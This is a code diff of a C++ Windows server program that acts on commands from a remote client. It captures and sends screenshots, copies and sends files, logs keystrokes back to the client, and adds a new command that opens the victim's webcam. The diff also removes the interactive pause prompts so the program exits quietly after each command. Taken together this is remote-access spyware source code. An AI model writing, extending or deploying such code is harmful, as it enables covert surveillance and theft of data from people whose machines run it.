@@ -187,13 +187,13 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 // Function to send a screenshot image to the client
 void Server::sendScreenshot(SOCKET clientSocket, const std::string &filePath) {
     std::vector<unsigned char> imageData = captureScreenshot();
-    uint32_t dataSize = htonl(imageData.size());
+    uint32_t dataSize = htonl(static_cast<u_long>(imageData.size()));
 
     // Send size first
     send(clientSocket, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0);
 
     // Send image data
-    send(clientSocket, reinterpret_cast<const char*>(imageData.data()), imageData.size(), 0);
+    send(clientSocket, reinterpret_cast<const char*>(imageData.data()), static_cast<int>(imageData.size()), 0);
 }
 
 
@@ -246,8 +246,8 @@ void Server::handleClient(SOCKET clientSocket) {
             // sendScreenshot(clientSocket, "screenshot.png");
             sendScreenshot(clientSocket, "screenshot.png");
 
-            std::cout << "Press enter to exit!";
-            std::cin.get();
+            // std::cout << "Press enter to exit!";
+            // std::cin.get();
 
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             exit(0);  // Exit the server program
@@ -265,11 +265,18 @@ void Server::handleClient(SOCKET clientSocket) {
             // Call the method to copy the file and send it back
             copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
 
-            std::cout << "Press enter to exit!";
-            std::cin.get();
+            // std::cout << "Press enter to exit!";
+            // std::cin.get();
 
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             exit(0);  // Exit the server program
+        }
+        else if (receivedMessage == "open_webcam")
+        {
+            openWebcam(clientSocket);
+
+            closesocket(listenSocket);
+            exit(0);
         }
     } else if (result == 0) {
         std::cout << "Connection closing..." << std::endl;
@@ -280,10 +287,12 @@ void Server::handleClient(SOCKET clientSocket) {
 
 // Implementation of copyFileAndSend
 void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName) {
+    std::cout << "Check" << std::endl;
     std::ifstream sourceFile(sourceFileName, std::ios::binary);
+    std::cout << "Check" << std::endl;
     if (!sourceFile) {
         std::string errorMessage = "Failed to open source file: " + sourceFileName;
-        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
         return;
     }
 
@@ -291,7 +300,7 @@ void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileN
     std::ofstream destinationFile(destinationFileName, std::ios::binary);
     if (!destinationFile) {
         std::string errorMessage = "Failed to create destination file: " + destinationFileName;
-        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
         return;
     }
 
@@ -311,17 +320,17 @@ void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileN
         copiedFile.seekg(0, std::ios::beg);
 
         // Send the size first
-        uint32_t fileSize = htonl(size);
+        uint32_t fileSize = htonl(static_cast<u_long>(size));
         send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);
 
         // Send the file data
         char buffer[4096];
         while (copiedFile.read(buffer, sizeof(buffer))) {
-            send(clientSocket, buffer, copiedFile.gcount(), 0);
+            send(clientSocket, buffer, static_cast<int>(copiedFile.gcount()), 0);
         }
         // Send any remaining bytes
         if (copiedFile.gcount() > 0) {
-            send(clientSocket, buffer, copiedFile.gcount(), 0);
+            send(clientSocket, buffer, static_cast<int>(copiedFile.gcount()), 0);
         }
 
         std::cout << "File copied and sent back to client successfully." << std::endl;
@@ -438,7 +447,7 @@ void Server::readKey(int _key, SOCKET clientSocket) {
                 break;
         }
     }
-    send(clientSocket, output, strlen(output), 0);
+    send(clientSocket, output, static_cast<int>(strlen(output)), 0);
    
 }
 
@@ -457,4 +466,40 @@ void Server::keyLogger(SOCKET clientSocket) {
             }
         }
     }
+}
+
+void Server::openWebcam(SOCKET clientSocket) {
+    cv::VideoCapture webcam(0); // Open default camera (usually 0)
+    
+    if (!webcam.isOpened()) {
+        std::string errorMessage = "Failed to open webcam.";
+        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
+        std::cerr << "Error: " << errorMessage << std::endl;
+        return;
+    }
+
+    // std::string successMessage = "Webcam opened successfully.";
+    // send(clientSocket, successMessage.c_str(), static_cast<int>(successMessage.size()), 0);
+    // std::cout << successMessage << std::endl;
+
+    std::string successMessage = "Webcam opened successfully.";
+    send(clientSocket, successMessage.c_str(), static_cast<int>(successMessage.size()), 0);
+    std::cout << successMessage << std::endl;
+
+    cv::Mat frame;
+    while (true) {
+        webcam >> frame; // Capture a new frame
+        if (frame.empty()) break; // Check if frame is empty
+        cv::imshow("Webcam Feed", frame); // Display the frame
+
+        // You may want to send this frame to the client
+        // (Add your frame sending logic here if needed)
+
+        if (cv::waitKey(30) >= 0) break; // Break loop on key press
+    }
+
+    webcam.release(); // Release the camera
+    cv::destroyAllWindows(); // Close any OpenCV windows
+
+    // Capture loop can be implemented here, for now, we just open the webcam
 }
